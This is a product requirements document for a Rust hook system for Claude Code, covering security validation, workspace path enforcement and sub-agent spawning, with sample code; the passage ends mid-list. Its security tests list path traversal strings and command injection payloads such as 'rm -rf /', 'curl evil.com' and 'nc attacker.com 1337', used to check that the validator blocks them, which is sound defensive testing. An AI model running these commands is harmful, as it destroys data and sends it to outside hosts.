# PRD 6: MAOS Hook Integration

## Executive Summary

The MAOS Hook Integration provides blazing-fast (<10ms) Claude Code hook implementations in Rust, replacing the existing Python hooks while maintaining 100% backwards compatibility. This system processes pre-tool-use and post-tool-use events, enabling intelligent tool parameter modification for task spawning, workspace path enforcement, security validation, and seamless agent orchestration.

**Key Deliverable**: A high-performance hook processing system that integrates seamlessly with Claude Code, providing security validation, workspace management, task spawning, and agent coordination through tool parameter modification—all while maintaining sub-10ms response times.

## Problem Statement

The current Python hook implementation suffers from:
- **Performance Bottlenecks**: Python startup and import overhead adds 50-200ms latency per hook execution
- **Maintenance Complexity**: Separate Python codebase requiring different tooling and deployment
- **Limited Tool Modification**: Cannot easily modify tool parameters for task spawning and workspace assignment  
- **Resource Overhead**: Python runtime memory footprint and GIL limitations
- **Integration Friction**: JSON serialization/deserialization overhead between Python and Rust components
- **Development Fragmentation**: Split development between Python hooks and Rust core components

We need a unified Rust-based hook system that delivers Claude Code integration with minimal performance impact while enabling advanced features like dynamic task spawning and intelligent workspace management.

## Goals & Success Metrics

### Primary Goals

1. **Ultra-Low Latency**: All hook operations complete in <10ms total execution time
2. **Seamless Integration**: Drop-in replacement for existing Python hooks with zero configuration changes
3. **Task Spawning Capability**: Modify tool parameters to spawn sub-agents for specific tasks
4. **Workspace Enforcement**: Validate and enforce workspace boundaries for all file operations
5. **Security Integration**: Block dangerous operations while providing clear error messages

### Success Metrics

- **Performance**: Hook execution completes in <10ms (90th percentile)
- **Memory Efficiency**: <2MB memory usage per hook execution
- **Compatibility**: 100% backwards compatibility with existing `.claude/settings.json` configurations
- **Reliability**: 99.9% success rate for valid tool calls
- **Security Coverage**: Block 100% of path traversal attempts and dangerous commands
- **Task Spawning**: Successfully spawn and coordinate sub-agents for 95% of qualifying tool calls

## User Personas & Use Cases

### Primary User: Claude Code
**Profile**: AI assistant executing tools through MAOS hooks
**Use Case**: Fast, reliable hook processing that doesn't interrupt natural workflow
**Success Criteria**: Imperceptible latency with intelligent behavior modifications

### Secondary User: Agent Orchestrator
**Profile**: MAOS component that coordinates multiple agents
**Use Case**: Spawn sub-agents based on tool parameters and workspace requirements
**Success Criteria**: Seamless task delegation with proper workspace isolation

### Tertiary User: Developer
**Profile**: Human developer working with Claude Code in MAOS-enabled workspace
**Use Case**: Security protection and workspace management without workflow disruption
**Success Criteria**: Transparent operation with clear error messages when needed

## Functional Requirements

### 1. Pre-Tool-Use Hook Processing

#### 1.1 Hook Input Processing
```rust
/// Claude Code pre-tool-use hook input format
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreToolHookInput {
    pub session_id: String,
    pub transcript_path: PathBuf,
    pub cwd: PathBuf,
    pub hook_event_name: String, // "PreToolUse"
    pub tool_name: String,
    pub tool_input: serde_json::Value,
}

/// Enhanced tool call with MAOS context
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnhancedToolCall {
    pub original: PreToolHookInput,
    pub session_context: Option<SessionContext>,
    pub workspace_assignment: Option<WorkspaceAssignment>,
    pub security_assessment: SecurityAssessment,
    pub spawn_recommendation: Option<TaskSpawnRecommendation>,
}
```

#### 1.2 Security Validation Engine
```rust
/// Security assessment for tool calls
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityAssessment {
    pub risk_level: RiskLevel,
    pub blocked_reasons: Vec<String>,
    pub allowed_with_constraints: Vec<PathConstraint>,
    pub requires_confirmation: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum RiskLevel {
    Safe,           // Normal operation
    Monitored,      // Log but allow
    Restricted,     // Allow with constraints
    Blocked,        // Block with exit code 2
}

impl SecurityValidator {
    /// Analyze tool call for security risks
    pub fn assess_tool_call(
        &self,
        tool_call: &PreToolHookInput,
        workspace_root: &Path,
    ) -> Result<SecurityAssessment, ValidationError> {
        // Analyze tool name and parameters
        // Check file paths for traversal attempts
        // Validate against blocked patterns
        // Apply workspace boundary rules
    }
    
    /// Check if tool call should spawn sub-agent
    pub fn should_spawn_agent(
        &self,
        tool_call: &PreToolHookInput,
        session_context: &SessionContext,
    ) -> Option<TaskSpawnRecommendation> {
        // Analyze tool complexity and scope
        // Check current agent capacity
        // Determine optimal agent type for task
    }
}
```

#### 1.3 Tool Parameter Modification
```rust
/// Tool parameter modification for task spawning
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskSpawnRecommendation {
    pub agent_type: AgentType,
    pub workspace_path: PathBuf,
    pub modified_parameters: serde_json::Value,
    pub delegation_message: String,
}

impl ToolParameterModifier {
    /// Modify tool parameters based on agent capabilities and rules
    pub fn modify_for_task_spawn(
        &self,
        original_params: &serde_json::Value,
        spawn_rec: &TaskSpawnRecommendation,
        agent_config: &AgentCapabilities,
        modification_rules: &[ModificationRule],
    ) -> Result<serde_json::Value, ModificationError> {
        // Apply rules based on agent capabilities, not hardcoded types
        let mut modified_params = original_params.clone();
        
        for rule in modification_rules {
            if rule.matches_capabilities(&agent_config.capabilities) {
                modified_params = rule.apply_modifications(&modified_params, spawn_rec)?;
            }
        }
        
        Ok(modified_params)
    }
    
    /// Inject workspace path constraints into tool parameters
    pub fn enforce_workspace_constraints(
        &self,
        params: &mut serde_json::Value,
        constraints: &[PathConstraint],
    ) -> Result<(), ConstraintError> {
        // Modify file paths to be relative to assigned workspace
        // Add workspace root prefix to path parameters
        // Validate all paths are within boundaries
    }
}
```

### 2. Post-Tool-Use Hook Processing

#### 2.1 Tool Result Processing
```rust
/// Post-tool-use hook processing with metrics and cleanup
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PostToolHookInput {
    pub session_id: String,
    pub transcript_path: PathBuf,
    pub cwd: PathBuf,
    pub hook_event_name: String, // "PostToolUse"
    pub tool_name: String,
    pub tool_input: serde_json::Value,
    pub tool_result: Option<ToolExecutionResult>,
    pub execution_time_ms: Option<u64>,
}

/// Tool execution result analysis
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolExecutionResult {
    pub success: bool,
    pub output: Option<String>,
    pub error: Option<String>,
    pub exit_code: Option<i32>,
    pub files_modified: Vec<PathBuf>,
}

impl PostToolProcessor {
    /// Process tool execution results
    pub fn process_tool_result(
        &mut self,
        input: &PostToolHookInput,
        session_context: &mut SessionContext,
    ) -> Result<PostProcessingAction, ProcessingError> {
        // Record execution metrics
        // Update session progress
        // Trigger cleanup if needed
        // Assess need for follow-up actions
    }
    
    /// Release locks and cleanup resources
    pub fn cleanup_resources(
        &mut self,
        tool_call: &PostToolHookInput,
        session_context: &SessionContext,
    ) -> Result<(), CleanupError> {
        // Release file locks
        // Update agent status
        // Clean temporary files
        // Update coordination state
    }
}
```

#### 2.2 Progress Tracking and Metrics
```rust
/// Session progress tracking
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProgressTracker {
    pub session_id: SessionId,
    pub total_tool_calls: u64,
    pub successful_calls: u64,
    pub failed_calls: u64,
    pub execution_times: RingBuffer<Duration>,
    pub error_patterns: HashMap<String, u32>,
}

impl ProgressTracker {
    /// Update progress with tool execution data
    pub fn record_tool_execution(
        &mut self,
        tool_name: &str,
        execution_time: Duration,
        success: bool,
        error: Option<&str>,
    ) {
        // Update counters and metrics
        // Detect error patterns
        // Trigger alerts if needed
    }
    
    /// Export metrics for performance analysis
    pub fn export_metrics(&self) -> MetricsSnapshot {
        // Generate performance report
        // Calculate statistics
        // Identify bottlenecks
    }
}
```

### 3. Workspace Path Enforcement

#### 3.1 Path Validation and Rewriting
```rust
/// Workspace path enforcement system
pub struct WorkspacePathEnforcer {
    workspace_assignments: HashMap<SessionId, HashMap<AgentId, PathBuf>>,
    path_validator: PathValidator,
    rewrite_rules: Vec<PathRewriteRule>,
}

impl WorkspacePathEnforcer {
    /// Enforce workspace boundaries for tool parameters
    pub fn enforce_workspace_paths(
        &self,
        tool_params: &mut serde_json::Value,
        session_id: &SessionId,
        agent_id: Option<&AgentId>,
    ) -> Result<Vec<PathModification>, EnforcementError> {
        match tool_params {
            Value::Object(map) => {
                let mut modifications = Vec::new();
                for (key, value) in map.iter_mut() {
                    if self.is_path_parameter(key) {
                        let modification = self.rewrite_path_value(
                            value, session_id, agent_id
                        )?;
                        if let Some(mod_info) = modification {
                            modifications.push(mod_info);
                        }
                    }
                }
                Ok(modifications)
            }
            _ => Ok(Vec::new()),
        }
    }
    
    /// Rewrite file paths to assigned workspace
    fn rewrite_path_value(
        &self,
        path_value: &mut Value,
        session_id: &SessionId,
        agent_id: Option<&AgentId>,
    ) -> Result<Option<PathModification>, EnforcementError> {
        // Get assigned workspace for agent
        // Validate path is safe
        // Rewrite to workspace-relative path
        // Record modification for logging
    }
}
```

#### 3.2 Dynamic Workspace Assignment
```rust
/// Dynamic workspace assignment for spawned agents
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkspaceAssignment {
    pub agent_id: AgentId,
    pub workspace_root: PathBuf,
    pub allowed_patterns: Vec<String>,
    pub blocked_patterns: Vec<String>,
    pub read_only_paths: Vec<PathBuf>,
}

impl WorkspaceAssigner {
    /// Assign workspace for new agent spawn
    pub fn assign_workspace(
        &mut self,
        session_id: &SessionId,
        agent_type: &AgentType,
        tool_scope: &ToolScope,
    ) -> Result<WorkspaceAssignment, AssignmentError> {
        // Generate unique workspace path
        // Create workspace directory structure
        // Set up Git worktree if needed
        // Configure access permissions
    }
    
    /// Update workspace permissions based on tool requirements
    pub fn update_workspace_permissions(
        &mut self,
        agent_id: &AgentId,
        new_requirements: &WorkspaceRequirements,
    ) -> Result<(), PermissionError> {
        // Validate permission escalation
        // Update allowed/blocked patterns
        // Modify file system permissions
        // Record permission changes
    }
}
```

### 4. Performance Optimization Framework

#### 4.1 Zero-Copy JSON Processing
```rust
/// Zero-copy JSON processing for hook inputs
pub struct HookJsonProcessor {
    parser: simd_json::Parser,
    buffer_pool: ObjectPool<Vec<u8>>,
    string_cache: LruCache<String, Arc<str>>,
}

impl HookJsonProcessor {
    /// Parse hook input with minimal allocations
    pub fn parse_hook_input(
        &mut self,
        input_bytes: &mut [u8],
    ) -> Result<PreToolHookInput, ParseError> {
        // Use SIMD JSON for fast parsing
        // Reuse buffer allocations
        // Cache common string values
        // Minimize heap allocations
    }
    
    /// Serialize response with zero-copy optimizations
    pub fn serialize_response<T: Serialize>(
        &mut self,
        response: &T,
    ) -> Result<Vec<u8>, SerializeError> {
        // Pre-allocate buffer based on typical sizes
        // Use streaming serialization
        // Optimize for common response patterns
    }
}
```

#### 4.2 Async Processing Pipeline
```rust
/// Async hook processing pipeline for maximum throughput
pub struct HookProcessingPipeline {
    input_processor: AsyncJsonProcessor,
    security_validator: AsyncSecurityValidator,
    workspace_enforcer: AsyncWorkspaceEnforcer,
    output_serializer: AsyncOutputSerializer,
    metrics_collector: AsyncMetricsCollector,
}

impl HookProcessingPipeline {
    /// Process hook with async pipeline for sub-10ms latency
    pub async fn process_pre_tool_hook(
        &mut self,
        input_stream: impl AsyncRead + Unpin,
        output_stream: impl AsyncWrite + Unpin,
    ) -> Result<ProcessingMetrics, PipelineError> {
        // Parse input asynchronously
        // Pipeline security validation
        // Apply workspace enforcement
        // Serialize and write response
        // Collect timing metrics
    }
    
    /// Batch process multiple hooks for efficiency
    pub async fn batch_process_hooks(
        &mut self,
        hooks: Vec<HookProcessingRequest>,
    ) -> Vec<Result<HookProcessingResponse, PipelineError>> {
        // Process hooks in parallel
        // Share common validation work
        // Optimize resource utilization
    }
}
```

## Non-Functional Requirements

### Performance Requirements
- **Hook Execution Time**: Complete processing in <10ms (95th percentile)
- **Memory Usage**: <2MB peak memory per hook execution
- **CPU Usage**: <5ms CPU time per hook on modern hardware
- **Throughput**: Support 100+ hooks/second sustained rate
- **Cold Start**: First hook execution <20ms (including initialization)

### Reliability Requirements
- **Availability**: 99.9% successful hook execution for valid inputs
- **Error Recovery**: Graceful handling of malformed inputs without crashes
- **Resource Cleanup**: 100% cleanup of temporary resources on completion
- **Backward Compatibility**: 100% compatibility with existing Python hook interfaces

### Security Requirements
- **Path Traversal Protection**: Block 100% of directory traversal attempts
- **Command Injection Prevention**: Validate all shell command parameters
- **Workspace Isolation**: Enforce strict workspace boundaries
- **Input Validation**: Sanitize all JSON inputs against malicious payloads

### Scalability Requirements
- **Concurrent Hooks**: Support 10+ concurrent hook executions
- **Session Scaling**: Handle 50+ active sessions simultaneously
- **Memory Scaling**: Linear memory usage with concurrent executions
- **Agent Coordination**: Coordinate 10+ agents per session efficiently

## Technical Design

### 1. Hook Processing Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Claude Code   │───▶│  MAOS CLI Hook  │───▶│  Hook Processor │
│     (stdin)     │    │    Commands     │    │    Pipeline     │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                                │                       │
                                ▼                       ▼
                       ┌─────────────────┐    ┌─────────────────┐
                       │  JSON Message   │    │  Security &     │
                       │    Parsing      │    │  Workspace      │
                       └─────────────────┘    │  Validation     │
                                │              └─────────────────┘
                                ▼                       │
                       ┌─────────────────┐              ▼
                       │  Tool Parameter │    ┌─────────────────┐
                       │  Modification   │    │  Task Spawning  │
                       └─────────────────┘    │  Coordination   │
                                │              └─────────────────┘
                                ▼                       │
                       ┌─────────────────┐              ▼
                       │  Response       │    ┌─────────────────┐
                       │  Generation     │    │  Progress &     │
                       └─────────────────┘    │  Metrics        │
                                │              └─────────────────┘
                                ▼
                       ┌─────────────────┐
                       │   Exit Code     │
                       │   (stdout)      │
                       └─────────────────┘
```

### 2. CLI Command Integration

#### 2.1 Hook Command Structure
```rust
/// CLI commands for Claude Code hook integration
#[derive(Debug, Subcommand)]
pub enum HookCommand {
    /// Process pre-tool-use hook
    PreToolUse {
        /// Enable debug output
        #[arg(long)]
        debug: bool,
        
        /// Workspace root override
        #[arg(long)]
        workspace_root: Option<PathBuf>,
        
        /// Disable task spawning
        #[arg(long)]
        no_spawn: bool,
    },
    
    /// Process post-tool-use hook
    PostToolUse {
        /// Enable debug output
        #[arg(long)]
        debug: bool,
        
        /// Force cleanup even on errors
        #[arg(long)]
        force_cleanup: bool,
    },
    
    /// Process notification hook
    Notify {
        /// TTS voice to use
        #[arg(long)]
        voice: Option<String>,
        
        /// Disable TTS output
        #[arg(long)]
        silent: bool,
    },
}

impl HookCommand {
    /// Execute hook command with performance monitoring
    pub async fn execute(
        &self,
        config: &MaosConfig,
        metrics: &mut MetricsCollector,
    ) -> Result<ExitCode, HookExecutionError> {
        let start_time = Instant::now();
        
        let result = match self {
            HookCommand::PreToolUse { debug, workspace_root, no_spawn } => {
                self.handle_pre_tool_use(config, debug, workspace_root, no_spawn).await
            }
            HookCommand::PostToolUse { debug, force_cleanup } => {
                self.handle_post_tool_use(config, debug, force_cleanup).await
            }
            HookCommand::Notify { voice, silent } => {
                self.handle_notify(config, voice, silent).await
            }
        };
        
        metrics.record_hook_execution(
            self.command_name(),
            start_time.elapsed(),
            result.is_ok(),
        );
        
        result
    }
}
```

#### 2.2 Stdin/Stdout Processing
```rust
/// High-performance stdin/stdout processing for hooks
pub struct HookIOProcessor {
    stdin_buffer: Vec<u8>,
    stdout_buffer: Vec<u8>,
    max_input_size: usize,
}

impl HookIOProcessor {
    /// Read and parse hook input from stdin
    pub async fn read_hook_input<T: DeserializeOwned>(
        &mut self,
    ) -> Result<T, IOError> {
        // Read from stdin with timeout
        // Validate input size limits
        // Parse JSON with error recovery
        // Return typed hook input
        tokio::time::timeout(
            Duration::from_millis(100),
            self.read_stdin_to_buffer()
        ).await??;
        
        simd_json::from_slice(&mut self.stdin_buffer)
            .map_err(IOError::JsonParse)
    }
    
    /// Write hook response to stdout
    pub async fn write_hook_response<T: Serialize>(
        &mut self,
        response: &T,
    ) -> Result<(), IOError> {
        // Serialize response efficiently
        // Write to stdout atomically
        // Flush output immediately
        self.stdout_buffer.clear();
        simd_json::to_writer(&mut self.stdout_buffer, response)?;
        
        tokio::io::stdout()
            .write_all(&self.stdout_buffer)
            .await
            .map_err(IOError::Write)?;
            
        tokio::io::stdout()
            .flush()
            .await
            .map_err(IOError::Flush)
    }
}
```

### 3. Capability-Based Rule System

Define rules for hook operations based on agent capabilities, not hardcoded types.

```rust
/// Rule for modifying tool parameters based on agent capabilities
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModificationRule {
    pub name: String,
    pub description: String,
    pub required_capabilities: Vec<String>,  // ALL must match
    pub optional_capabilities: Vec<String>,  // ANY can match
    pub conditions: Vec<RuleCondition>,
    pub actions: Vec<RuleAction>,
    pub priority: i32,  // Higher priority rules apply first
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum RuleCondition {
    ToolNameMatches(String),
    ParameterExists(String),
    ParameterValueMatches { param: String, pattern: String },
    ContextMatches(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum RuleAction {
    ModifyParameter { name: String, value: serde_json::Value },
    AddParameter { name: String, value: serde_json::Value },
    RemoveParameter(String),
    TransformParameter { name: String, transform: ParameterTransform },
}

impl ModificationRule {
    pub fn matches_capabilities(&self, agent_capabilities: &[String]) -> bool {
        // Check all required capabilities are present
        let has_required = self.required_capabilities.iter()
            .all(|cap| agent_capabilities.contains(cap));
        
        // Check at least one optional capability if specified
        let has_optional = self.optional_capabilities.is_empty() ||
            self.optional_capabilities.iter()
                .any(|cap| agent_capabilities.contains(cap));
        
        has_required && has_optional
    }
    
    pub fn apply_modifications(
        &self,
        params: &serde_json::Value,
        context: &TaskSpawnRecommendation,
    ) -> Result<serde_json::Value, ModificationError> {
        // Check conditions
        for condition in &self.conditions {
            if !self.check_condition(condition, params, context)? {
                return Ok(params.clone());
            }
        }
        
        // Apply actions
        let mut modified = params.clone();
        for action in &self.actions {
            modified = self.apply_action(action, modified)?;
        }
        
        Ok(modified)
    }
}

/// Load rules from user configuration
pub fn load_modification_rules() -> Result<Vec<ModificationRule>, ConfigError> {
    // Load from .maos/config/rules.toml or similar
    // Users define their own rules for their agents
    let config_path = dirs::config_dir()
        .ok_or(ConfigError::NoConfigDir)?
        .join("maos")
        .join("rules.toml");
    
    if !config_path.exists() {
        return Ok(Vec::new()); // No rules defined
    }
    
    let content = std::fs::read_to_string(&config_path)?;
    toml::from_str(&content).map_err(ConfigError::ParseError)
}
```

#### Example User Configuration (.maos/config/rules.toml)

```toml
# User-defined rules for agent behavior
# No hardcoded agent types - users define capabilities

[[rules]]
name = "code-analysis-delegation"
description = "Delegate code analysis tasks to agents with analysis capabilities"
required_capabilities = ["code-analysis", "file-reading"]
optional_capabilities = ["ast-parsing", "security-scanning"]
priority = 10

[[rules.conditions]]
type = "ToolNameMatches"
value = "Task"

[[rules.conditions]]
type = "ParameterValueMatches"
param = "description"
pattern = "analyze|review|scan|audit"

[[rules.actions]]
type = "AddParameter"
name = "workspace_constraints"
value = { paths = ["src/", "lib/"], read_only = true }

[[rules]]
name = "test-execution-delegation"
description = "Delegate test execution to agents with testing capabilities"
required_capabilities = ["test-execution"]
optional_capabilities = ["coverage-analysis", "performance-testing"]
priority = 15

[[rules.conditions]]
type = "ParameterValueMatches"
param = "prompt"
pattern = "test|spec|coverage"

[[rules.actions]]
type = "ModifyParameter"
name = "subagent_type"
value = "${agent_with_capabilities}"  # Dynamic resolution
```

### 4. Tool Parameter Modification System

#### 4.1 Parameter Analysis Engine
```rust
/// Tool parameter analysis for intelligent modification
pub struct ParameterAnalyzer {
    tool_schemas: HashMap<String, ToolSchema>,
    modification_rules: Vec<ModificationRule>,
    path_extractors: HashMap<String, PathExtractor>,
}

impl ParameterAnalyzer {
    /// Analyze tool parameters for modification opportunities
    pub fn analyze_parameters(
        &self,
        tool_name: &str,
        parameters: &serde_json::Value,
        context: &AnalysisContext,
    ) -> Result<ParameterAnalysis, AnalysisError> {
        let schema = self.tool_schemas.get(tool_name)
            .ok_or(AnalysisError::UnknownTool)?;
            
        let mut analysis = ParameterAnalysis::new();
        
        // Extract file paths from parameters
        if let Some(extractor) = self.path_extractors.get(tool_name) {
            analysis.file_paths = extractor.extract_paths(parameters)?;
        }
        
        // Apply modification rules
        for rule in &self.modification_rules {
            if rule.matches(tool_name, parameters, context) {
                analysis.modifications.push(rule.generate_modification(parameters)?);
            }
        }
        
        // Assess spawning potential
        analysis.spawn_assessment = self.assess_spawn_potential(
            tool_name, parameters, context
        )?;
        
        Ok(analysis)
    }
}
```

#### 3.2 Task Spawning Decision Engine
```rust
/// Task spawning decision engine
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpawnDecisionEngine {
    spawn_rules: Vec<SpawnRule>,
    agent_capacity_tracker: AgentCapacityTracker,
    workspace_allocator: WorkspaceAllocator,
}

impl SpawnDecisionEngine {
    /// Determine if tool call should spawn new agent
    pub fn should_spawn_agent(
        &self,
        tool_call: &PreToolHookInput,
        session_context: &SessionContext,
    ) -> Option<SpawnDecision> {
        // Check if current agent is overloaded
        if !self.agent_capacity_tracker.can_handle_task(
            &session_context.current_agent_id,
            &tool_call.tool_name
        ) {
            return self.recommend_spawn_for_capacity(tool_call, session_context);
        }
        
        // Check for specialized agent requirements
        for rule in &self.spawn_rules {
            if let Some(decision) = rule.evaluate(tool_call, session_context) {
                return Some(decision);
            }
        }
        
        None
    }
    
    /// Generate spawn recommendation with workspace assignment
    fn recommend_spawn_for_capacity(
        &self,
        tool_call: &PreToolHookInput,
        session_context: &SessionContext,
    ) -> Option<SpawnDecision> {
        let agent_type = self.determine_optimal_agent_type(&tool_call.tool_name);
        let workspace = self.workspace_allocator.allocate_workspace(
            &session_context.session_id,
            &agent_type,
            &tool_call.cwd,
        ).ok()?;
        
        Some(SpawnDecision {
            agent_type,
            workspace_assignment: workspace,
            justification: format!(
                "Current agent at capacity, spawning {} for {}",
                agent_type, tool_call.tool_name
            ),
            parameter_modifications: self.generate_spawn_modifications(tool_call, &workspace),
        })
    }
}
```

### 4. Memory Management and Optimization

#### 4.1 Object Pooling Strategy
```rust
/// Object pools for high-frequency allocations
pub struct HookObjectPools {
    json_buffers: Pool<Vec<u8>>,
    string_buffers: Pool<String>,
    path_buffers: Pool<PathBuf>,
    hook_inputs: Pool<PreToolHookInput>,
    security_assessments: Pool<SecurityAssessment>,
}

impl HookObjectPools {
    /// Get pooled buffer for JSON processing
    pub fn get_json_buffer(&self) -> PooledObject<Vec<u8>> {
        self.json_buffers.get()
    }
    
    /// Get pooled hook input object
    pub fn get_hook_input(&self) -> PooledObject<PreToolHookInput> {
        let mut input = self.hook_inputs.get();
        input.reset(); // Clear previous data
        input
    }
    
    /// Pre-warm pools for optimal performance
    pub fn pre_warm(&self) {
        // Pre-allocate commonly used objects
        for _ in 0..10 {
            drop(self.json_buffers.get());
            drop(self.hook_inputs.get());
        }
    }
}
```

#### 4.2 SIMD-Optimized JSON Processing
```rust
/// SIMD-optimized JSON processing for maximum performance
pub struct SIMDJsonProcessor {
    parser: simd_json::Parser,
    dom_buffer: Vec<u8>,
    tape_buffer: Vec<u8>,
}

impl SIMDJsonProcessor {
    /// Parse JSON with SIMD optimizations
    pub fn parse_hook_json(
        &mut self,
        input: &mut [u8],
    ) -> Result<simd_json::OwnedValue, JsonError> {
        // Use SIMD instructions for parsing
        self.parser.parse(input)
            .map_err(JsonError::Parse)
    }
    
    /// Serialize with optimized buffering
    pub fn serialize_to_buffer<T: Serialize>(
        &mut self,
        value: &T,
        buffer: &mut Vec<u8>,
    ) -> Result<(), JsonError> {
        buffer.clear();
        simd_json::to_writer(buffer, value)
            .map_err(JsonError::Serialize)
    }
}
```

## Dependencies & Constraints

### External Dependencies (PRD-01 Foundation)
- **maos-core**: Core types, error handling, configuration (Essential)
- **serde**: JSON serialization with SIMD support (Essential)  
- **tokio**: Async runtime for pipeline processing (Essential)
- **simd-json**: High-performance JSON processing (Performance)
- **object-pool**: Memory pool management (Performance)
- **tracing**: Structured logging integration (Essential)

### Internal Dependencies
- **PRD-01**: Common Foundation (SessionId, AgentId, error types)
- **PRD-02**: Security Validation System (path validation, security rules)
- **PRD-03**: Session Management (session context, agent coordination)
- **PRD-04**: Git Worktree Management (workspace creation and assignment)
- **PRD-05**: TTS Integration (notification processing)

### Performance Constraints
- **Execution Time Budget**: <10ms total for pre-tool-use processing
- **Memory Budget**: <2MB peak memory usage per hook execution
- **CPU Budget**: <5ms CPU time on modern hardware
- **I/O Constraint**: <1ms for stdin/stdout operations

### Compatibility Constraints
- **Claude Code Integration**: Must work with existing `.claude/settings.json` format
- **Python Hook Compatibility**: Drop-in replacement during migration period
- **Cross-Platform Support**: Linux, macOS, Windows with consistent behavior
- **Version Compatibility**: Support Claude Code hook API v1.0+

## Success Criteria & Acceptance Tests

### Functional Success Criteria

1. **Hook Integration Completeness**
   - All five hook types (PreToolUse, PostToolUse, Notification, Stop, UserPromptSubmit) implemented
   - JSON message parsing matches Python implementation exactly
   - Exit codes and error messages maintain compatibility
   - Tool parameter modification works for all supported tools

2. **Task Spawning Functionality**
   - Successfully spawns appropriate agents for complex tool calls
   - Workspace assignment and isolation works correctly
   - Parameter modification enables proper task delegation
   - Agent coordination prevents conflicts and deadlocks

3. **Security and Workspace Enforcement**
   - Path traversal attempts blocked 100% of the time
   - Workspace boundaries enforced for all file operations
   - Dangerous commands identified and blocked appropriately
   - Security error messages provide actionable feedback

### Performance Success Criteria

1. **Sub-10ms Execution Times**
   - Pre-tool-use hooks: <8ms (95th percentile)
   - Post-tool-use hooks: <5ms (95th percentile)
   - Notification hooks: <3ms (95th percentile)
   - Cold start time: <20ms including initialization

2. **Memory Efficiency**
   - Peak memory usage <2MB per hook execution
   - Memory cleanup after each execution (no leaks)
   - Object pool reuse rate >90% for common objects
   - SIMD JSON processing performance gains >50% over standard

3. **Throughput and Scalability**
   - Sustained rate: 100+ hooks/second
   - Concurrent executions: 10+ without performance degradation
   - Linear scaling with additional CPU cores
   - No performance regression under load

### Quality Success Criteria

1. **Reliability Metrics**
   - 99.9% success rate for valid hook inputs
   - Zero crashes or panics under normal operation
   - Graceful handling of malformed inputs
   - 100% resource cleanup on both success and failure paths

2. **Compatibility Verification**
   - All existing `.claude/settings.json` configurations work unchanged
   - Drop-in replacement for Python hooks verified
   - Cross-platform consistency validated
   - Backward compatibility with older Claude Code versions

## Testing Strategy

### 1. Unit Testing Framework

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;
    use criterion::{black_box, criterion_group, criterion_main, Criterion};
    
    #[test]
    fn test_pre_tool_hook_parsing() {
        let input = r#"{
            "session_id": "test-123",
            "transcript_path": "/tmp/transcript.jsonl",
            "cwd": "/workspace",
            "hook_event_name": "PreToolUse",
            "tool_name": "Read",
            "tool_input": {"file_path": "/workspace/test.rs"}
        }"#;
        
        let parsed: PreToolHookInput = serde_json::from_str(input).unwrap();
        assert_eq!(parsed.tool_name, "Read");
        assert_eq!(parsed.session_id, "test-123");
    }
    
    proptest! {
        #[test]
        fn test_path_security_validation(
            malicious_path in "\\.\\..*|/\\.\\./.*|.*\\.\\..*",
            workspace in "/[a-zA-Z0-9/]+"
        ) {
            let validator = SecurityValidator::new();
            let assessment = validator.assess_path_safety(
                &malicious_path, 
                Path::new(&workspace)
            );
            
            // Should always block path traversal attempts
            assert_eq!(assessment.risk_level, RiskLevel::Blocked);
        }
    }
}
```

### 2. Performance Benchmarking

```rust
fn benchmark_hook_processing(c: &mut Criterion) {
    let mut processor = HookProcessor::new().unwrap();
    let sample_input = create_sample_hook_input();
    
    c.bench_function("pre_tool_hook_processing", |b| {
        b.iter(|| {
            let result = processor.process_pre_tool_hook(
                black_box(&sample_input)
            );
            black_box(result)
        })
    });
    
    // Performance regression detection
    c.bench_function("hook_memory_usage", |b| {
        b.iter_with_large_drop(|| {
            // Measure memory allocations
            let _result = processor.process_with_memory_tracking(
                black_box(&sample_input)
            );
        })
    });
}

criterion_group!(benches, benchmark_hook_processing);
criterion_main!(benches);
```

### 3. Integration Testing with Claude Code

```rust
/// Integration tests with actual Claude Code hook execution
#[tokio::test]
async fn test_claude_code_integration() {
    // Set up test environment with .claude/settings.json
    let temp_dir = setup_test_project().await;
    
    // Simulate Claude Code calling pre-tool-use hook
    let hook_input = PreToolHookInput {
        session_id: "integration-test".to_string(),
        tool_name: "Bash".to_string(),
        tool_input: json!({"command": "ls -la"}),
        cwd: temp_dir.path().to_path_buf(),
        // ... other fields
    };
    
    let mut cmd = Command::new("maos")
        .arg("pre-tool-use")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    
    // Send hook input via stdin
    let stdin = cmd.stdin.as_mut().unwrap();
    stdin.write_all(&serde_json::to_vec(&hook_input).unwrap()).await.unwrap();
    drop(cmd.stdin.take()); // Close stdin
    
    // Verify hook execution
    let output = cmd.wait_with_output().await.unwrap();
    assert!(output.status.success());
    
    // Verify performance requirements
    let execution_time = measure_execution_time();
    assert!(execution_time < Duration::from_millis(10));
}
```

### 4. Security Testing Framework

```rust
/// Security-focused testing for path traversal and injection
#[test]
fn test_security_attack_vectors() {
    let security_validator = SecurityValidator::new();
    
    // Test common path traversal patterns
    let attack_patterns = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/proc/self/environ",
        "file:///etc/passwd",
        "\\\\server\\share\\file",
    ];
    
    for pattern in attack_patterns {
        let assessment = security_validator.assess_tool_call(&PreToolHookInput {
            tool_input: json!({"file_path": pattern}),
            // ... other fields
        }, Path::new("/workspace")).unwrap();
        
        assert_eq!(assessment.risk_level, RiskLevel::Blocked);
        assert!(!assessment.blocked_reasons.is_empty());
    }
}

/// Test command injection prevention
#[test] 
fn test_command_injection_prevention() {
    let malicious_commands = vec![
        "ls; rm -rf /",
        "ls && curl evil.com",
        "ls | nc attacker.com 1337",
        "$(curl evil.com)",
        "`wget evil.com`",
